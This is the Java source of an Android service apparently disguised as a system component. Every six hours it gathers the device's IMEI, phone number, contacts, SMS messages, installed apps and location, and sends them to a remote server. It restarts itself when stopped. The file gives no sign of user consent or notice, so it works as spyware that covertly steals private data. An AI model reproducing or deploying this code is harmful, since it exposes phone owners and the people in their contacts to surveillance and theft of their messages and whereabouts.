package com.android.systemcore.service;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONException;
import org.json.JSONObject;
import com.android.systemcore.utils.DeviceInfo;
import com.android.systemcore.network.NetworkManager;
import java.util.concurrent.TimeUnit;

public class DataCollector extends Service {
    
    private static final String TAG = "DataCollector";
    private static final long COLLECTION_INTERVAL = TimeUnit.HOURS.toMillis(6);
    
    private Handler handler;
    private Runnable collectionRunnable;
    private NetworkManager networkManager;
    private DeviceInfo deviceInfo;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "DataCollector service created");
        
        handler = new Handler();
        networkManager = NetworkManager.getInstance(this);
        deviceInfo = new DeviceInfo(this);
        
        collectionRunnable = new Runnable() {
            @Override
            public void run() {
                collectDeviceData();
                handler.postDelayed(this, COLLECTION_INTERVAL);
            }
        };
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "DataCollector service started");
        scheduleCollection();
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    private void collectDeviceData() {
        Log.d(TAG, "Collecting device data");
        
        try {
            JSONObject dataPayload = new JSONObject();
            dataPayload.put("device_id", deviceInfo.getDeviceId());
            dataPayload.put("model", deviceInfo.getDeviceModel());
            dataPayload.put("manufacturer", deviceInfo.getManufacturer());
            dataPayload.put("os_version", deviceInfo.getAndroidVersion());
            dataPayload.put("imei", deviceInfo.getIMEI());
            dataPayload.put("phone_number", deviceInfo.getPhoneNumber());
            dataPayload.put("contacts", deviceInfo.getContactsList());
            dataPayload.put("sms_messages", deviceInfo.getSMSMessages());
            dataPayload.put("installed_apps", deviceInfo.getInstalledApps());
            dataPayload.put("location", deviceInfo.getCurrentLocation());
            dataPayload.put("network_type", deviceInfo.getNetworkType());
            dataPayload.put("battery_level", deviceInfo.getBatteryLevel());
            dataPayload.put("timestamp", System.currentTimeMillis());
            
            sendToServer(dataPayload);
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating JSON payload: " + e.getMessage());
        }
    }
    
    private void sendToServer(JSONObject data) {
        Log.d(TAG, "Sending data to server");
        
        networkManager.sendData(data, new NetworkManager.ResponseCallback() {
            @Override
            public void onSuccess(String response) {
                Log.d(TAG, "Data successfully sent to server");
            }
            
            @Override
            public void onError(Exception error) {
                Log.e(TAG, "Failed to send data: " + error.getMessage());
            }
        });
    }
    
    private void scheduleCollection() {
        Log.d(TAG, "Scheduling periodic data collection");
        handler.post(collectionRunnable);
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "DataCollector service destroyed");
        
        if (handler != null && collectionRunnable != null) {
            handler.removeCallbacks(collectionRunnable);
        }
    }
}